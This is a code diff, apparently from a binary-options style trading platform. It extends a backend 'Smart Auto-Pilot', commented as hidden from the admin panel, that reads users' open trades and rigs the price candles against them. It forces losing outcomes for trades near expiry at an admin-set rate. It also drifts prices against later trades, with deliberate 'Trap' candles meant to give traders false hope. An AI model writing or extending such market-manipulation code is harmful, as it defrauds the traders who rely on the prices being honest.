@@ -176,20 +176,54 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         // Priority 2: Smart Auto-Pilot (Hidden from Panel, operates in Backend)
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
-            let upVol = 0, downVol = 0;
+            let immediateUpVol = 0, immediateDownVol = 0;
+            let futureUpVol = 0, futureDownVol = 0;
+            const nextPeriod = currentPeriod + TIMEFRAME;
             
             Object.values(trades).forEach(t => {
-                if (t.direction === 'UP') upVol += t.amount;
-                if (t.direction === 'DOWN') downVol += t.amount;
+                // Check if trade expires at the end of this upcoming candle (Immediate Threat)
+                if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
+                    if (t.direction === 'UP') immediateUpVol += t.amount;
+                    if (t.direction === 'DOWN') immediateDownVol += t.amount;
+                } else {
+                    // Trades expiring in the future (Drift / Safety Zone calculation)
+                    if (t.direction === 'UP') futureUpVol += t.amount;
+                    if (t.direction === 'DOWN') futureDownVol += t.amount;
+                }
             });
 
-            if (upVol > 0 || downVol > 0) {
+            // Rule 1: Conflict Resolution - Immediate Expiry has absolute priority
+            if (immediateUpVol > 0 || immediateDownVol > 0) {
                 if (Math.random() < ADMIN_WIN_RATIO) {
-                    const targetDirection = upVol > downVol ? 'RED' : 'GREEN';
+                    const targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
                     newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                     newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
-                    console.log(`[AUTO-PILOT] ${marketData.marketId} -> U:${upVol} D:${downVol}. Forcing ${targetDirection}`);
+                    console.log(`[AUTO-PILOT IMMEDIATE] ${marketData.marketId} -> U:${immediateUpVol} D:${immediateDownVol}. Forcing ${targetDirection}`);
                 }
+            } 
+            // Rule 2: Continuous Safety Drift - No immediate threat, shift to safety for future trades
+            else if (futureUpVol > 0 || futureDownVol > 0) {
+                const driftTarget = futureUpVol > futureDownVol ? 'DOWN' : 'UP';
+                
+                // Natural Wave Generation (Zig-Zag towards safety)
+                const rand = Math.random();
+                let driftCommand = 'DOJI';
+                
+                if (driftTarget === 'DOWN') {
+                    if (rand < 0.50) driftCommand = 'RED'; // 50% normal red
+                    else if (rand < 0.70) driftCommand = 'RED_SHOOTING_STAR'; // 20% bearish rejection
+                    else if (rand < 0.85) driftCommand = 'GREEN_HAMMER'; // 15% fake green hope (Trap)
+                    else driftCommand = 'DOJI'; // 15% consolidation
+                } else {
+                    if (rand < 0.50) driftCommand = 'GREEN'; // 50% normal green
+                    else if (rand < 0.70) driftCommand = 'GREEN_HAMMER'; // 20% bullish rejection
+                    else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR'; // 15% fake red hope (Trap)
+                    else driftCommand = 'DOJI'; // 15% consolidation
+                }
+
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
+                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
+                console.log(`[AUTO-PILOT DRIFT] ${marketData.marketId} -> Future U:${futureUpVol} D:${futureDownVol}. Drifting ${driftTarget} via ${driftCommand}`);
             }
         }
         
